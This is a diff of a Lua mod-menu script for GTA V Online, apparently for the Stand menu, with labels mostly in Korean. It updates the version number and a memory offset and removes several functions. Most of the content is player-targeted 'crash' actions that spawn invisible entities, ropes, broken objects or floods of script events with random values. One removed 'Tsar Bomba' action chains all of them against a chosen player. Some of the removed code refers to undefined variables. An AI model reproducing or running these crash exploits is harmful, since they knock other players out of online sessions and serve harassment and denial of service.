@@ -10,7 +10,7 @@ util.require_natives(1663599433)
 util.toast("Ryze 스크립트에 오신 걸 환영합니다!")
 util.toast("스크립트 로딩중. (1-2s)")
 local response = false
-local localVer = 3.8
+local localVer = 3.81
 async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/Ryze-Scripts/Stand/RyzeScriptVersion.lua", function(output)
     currentVer = tonumber(output)
     response = true
@@ -1191,32 +1191,9 @@ players.on_join(function(player_id)
     --    end)
     --end)
 
-    menu.divider(crashes, "(세션)")
+    menu.divider(crashes, "(배타적)")
 
-    menu.action(crashes, "크래시 세션 V1 'Test'", {}, "", function(on_loop)
-        PHYSICS.ROPE_LOAD_TEXTURES()
-        local hashes = {2132890591, 2727244247}
-        local pc = players.get_position(player_id)
-        local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
-        local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
-        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
-        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
-        ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
-        ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
-        local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
-        local vehc = ENTITY.GET_ENTITY_COORDS(veh); local pedc = ENTITY.GET_ENTITY_COORDS(ped)
-        PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
-        util.yield(1000)
-        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
-        entities.delete_by_handle(veh); entities.delete_by_handle(ped)
-        PHYSICS.DELETE_CHILD_ROPE(rope)
-        PHYSICS.ROPE_UNLOAD_TEXTURES()
-    end)
-
-
-    menu.divider(crashes, "(Ryze 독점)")
-
-    menu.action(crashes, "말할 수 없는", {"crashv2"}, "Funcando (Menus populares - Stand)", function()
+    menu.action(crashes, "말할 수 없는", {"crashv2"}, "펑션 (인기 메뉴 - 스탠드)", function()
         for i = 1, 150 do
             util.trigger_script_event(1 << player_id, {0xA4D43510, player_id, 0xDF607FCD, math.random(int_min, int_max), math.random(int_min, int_max), 
             math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
@@ -1224,7 +1201,7 @@ players.on_join(function(player_id)
         end
     end)
 
-    menu.action(crashes, "말할 수 없는 V2", {"crashv3"}, "Funcando (Menus populares - Stand)", function()
+    menu.action(crashes, "말할 수 없는 V2", {"crashv3"}, "펑션 (인기 메뉴 - 스탠드)", function()
         local int_min = -2147483647
         local int_max = 2147483647
         for i = 1, 150 do
@@ -1245,10 +1222,7 @@ players.on_join(function(player_id)
 
     local twotake = menu.list(crashes, "2T1 크래쉬", {}, "")
 
-    local modelc = menu.list(twotake, "모델 크래쉬", {}, "")
-
-
-    menu.action(modelc, "잘못된 모델 V1", {"crashv4"}, "", function()
+    menu.action(twotake, "잘못된 모델 V1", {"crashv4"}, "", function()
         BlockSyncs(player_id, function()
             local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
             OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
@@ -1320,101 +1294,6 @@ players.on_join(function(player_id)
             util.yield(10)
         end
 
-    end)
-
-    menu.action(modelc, "잘못된 모델 V4", {"crashv12"}, "", function(on_toggle)
-        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
-        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)))
-        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
-        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
-            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
-        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
-            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
-        local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
-            OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
-            for i = 0, 100 do 
-                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
-                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
-                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
-                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
-                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
-            util.yield(10)
-            entities.delete_by_handle(Object_pizza2)
-            entities.delete_by_handle(Object_pizza2)
-            entities.delete_by_handle(Object_pizza2)
-            entities.delete_by_handle(Object_pizza2)
-            return
-        end
-    end)
-
-    local netc = menu.list(twotake, "네트워크 충돌", {}, "")
-
-    -- Skidded from keramist.
-
-    menu.action(netc, "네트워크 충돌 V1", {"crashv13"}, "", function(on_toggle)
-        local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
-        local vehicles = {}
-        for i = 1, 4 do
-            util.create_thread(function()
-                request_model(hashes[i])
-                local pcoords = players.get_position(player_id)
-                local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
-                for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
-                VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
-                for j = 0, 49 do
-                    local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1 
-                    VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
-                    VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
-                end
-                for j = 0, 20 do
-                    if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
-                end
-                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
-                VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
-                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
-                VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
-                for ai = 1, 50 do
-                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
-                    pcoords = players.get_position(player_id)
-                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
-                    util.yield()
-                end
-                vehicles[#vehicles+1] = veh
-            end)
-        end
-        util.yield(2000)
-        for _, v in pairs(vehicles) do
-            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
-            entities.delete_by_handle(v)
-        end
-    end)
-
-    menu.action(netc, "네트워크 충돌 V2", {"crashv14"}, "", function(on_loop)
-        local cord = players.get_position(player_id)
-        local a1 = entities.create_object(-930879665, cord)
-        local a2 = entities.create_object(3613262246, cord)
-        local b1 = entities.create_object(452618762, cord)
-        local b2 = entities.create_object(3613262246, cord)
-        for i = 1, 10 do
-            util.request_model(-930879665)
-            util.yield(10)
-            util.request_model(3613262246)
-            util.yield(10)
-            util.request_model(452618762)
-            util.yield(300)
-            entities.delete_by_handle(a1)
-            entities.delete_by_handle(a2)
-            entities.delete_by_handle(b1)
-            entities.delete_by_handle(b2)
-            util.request_model(452618762)
-            util.yield(10)
-            util.request_model(3613262246)
-            util.yield(10)
-            util.request_model(-930879665)
-            util.yield(10)
-        end
-        util.toast("완료")
     end)
 
     local scrcrash = menu.list(twotake, "스크립트 크래쉬", {}, "")
@@ -1898,8 +1777,6 @@ players.on_join(function(player_id)
         menu.trigger_commands("crashv10"..players.get_name(player_id))
         util.yield(800)
         menu.trigger_commands("crashv11"..players.get_name(player_id))
-        util.yield(800)
-        menu.trigger_commands("crashv12"..players.get_name(player_id))
         -- Turned off because of a self-crash error
         --util.yield(600)
         --menu.trigger_commands("crashv4"..players.get_name(player_id))
@@ -1916,69 +1793,7 @@ players.on_join(function(player_id)
         util.yield(600)
         menu.trigger_commands("flashcrash"..players.get_name(player_id))
         util.yield(1800)
-        util.toast("모든 게 깨끗해질 때까지 기다리세요")
-        --menu.trigger_command(outSync, "off")
-        menu.trigger_commands("rcleararea")
-        menu.trigger_commands("potatomode off")
-        menu.trigger_commands("trafficpotato off")
-        util.yield(8000)
-        menu.trigger_commands("anticrashcamera off")
-    end)
-
-    menu.action(crashes, "차르 폭탄 V3", {"tsarbomba3"}, "crash pc가 좋지 않으면 사용을 권장하지 않습니다 (잠글 수 있는 uwu)(잘 작동하려면 규칙 필요 / 오버로드 가능)", function()
-        local objective = player_id
-        --local outSync = menu.ref_by_path("나가는 동기화>차단")
-        menu.trigger_commands("anticrashcamera on")
-        menu.trigger_commands("potatomode on")
-        menu.trigger_commands("trafficpotato on")
-        util.toast("시작...")
-        util.toast("불쌍한 사람")
-        menu.trigger_commands("rlag3"..players.get_name(player_id))
-        util.yield(2500)
-        menu.trigger_commands("crashv1"..players.get_name(player_id))
-        util.yield(600)
-        menu.trigger_commands("crashv2"..players.get_name(player_id))
-        util.yield(600)
-        menu.trigger_commands("crashv3"..players.get_name(player_id))
-        util.yield(800)
-        menu.trigger_commands("crashv4"..players.get_name(player_id))
-        util.yield(600)
-        menu.trigger_commands("crashv5"..players.get_name(player_id))
-        util.yield(600)
-        menu.trigger_commands("crashv6"..players.get_name(player_id))
-        util.yield(600)
-        menu.trigger_commands("crashv7"..players.get_name(player_id))
-        util.yield(700)
-        menu.trigger_commands("crashv8"..players.get_name(player_id))
-        util.yield(700)
-        menu.trigger_commands("crashv9"..players.get_name(player_id))
-        util.yield(800)
-        menu.trigger_commands("crashv10"..players.get_name(player_id))
-        util.yield(800)
-        menu.trigger_commands("crashv11"..players.get_name(player_id))
-        util.yield(800)
-        menu.trigger_commands("crashv12"..players.get_name(player_id))
-        util.yield(800)
-        menu.trigger_commands("crashv13"..players.get_name(player_id))
-        util.yield(800)
-        menu.trigger_commands("crashv14"..players.get_name(player_id))
-        -- Turned off because of a self-crash error
-        --util.yield(600)
-        --menu.trigger_commands("crashv4"..players.get_name(player_id))
-        util.yield(2500)
-        menu.trigger_commands("crash"..players.get_name(player_id))
-        util.yield(800)
-        menu.trigger_commands("ngcrash"..players.get_name(player_id))
-        util.yield(600)
-        menu.trigger_commands("footlettuce"..players.get_name(player_id))
-        util.yield(800)
-        menu.trigger_commands("steamroll"..players.get_name(player_id))
-        util.yield(600)
-        menu.trigger_commands("choke"..players.get_name(player_id))
-        util.yield(600)
-        menu.trigger_commands("flashcrash"..players.get_name(player_id))
-        util.yield(1800)
-        util.toast("모든 게 깨끗해질 때까지 기다리세요")
+        util.toast("Espera en lo que se limpia todo...")
         --menu.trigger_command(outSync, "off")
         menu.trigger_commands("rcleararea")
         menu.trigger_commands("potatomode off")
@@ -3664,14 +3479,11 @@ end
 --    end
 --end
 
---------------------------------------------------------------------------------------------------------------------------------------------------------
--- Real Helicopter Mode Start
-
 get_vtable_entry_pointer = function(address, index)
     return memory.read_long(memory.read_long(address) + (8 * index))
 end
 get_sub_handling_types = function(vehicle, type)
-    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x918)
+    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x938)
     local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
     local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
     local types = {registerd = sub_handling_count, found = 0}
@@ -3722,7 +3534,6 @@ menu.action(realheli, "실제 헬리콥터 모드", {"betterheli"}, "실제 작�
     end
 end)
 
--- Real Helicopter Mode End
 --------------------------------------------------------------------------------------------------------------------------------------------------------
 --Impulse SportMode start
 
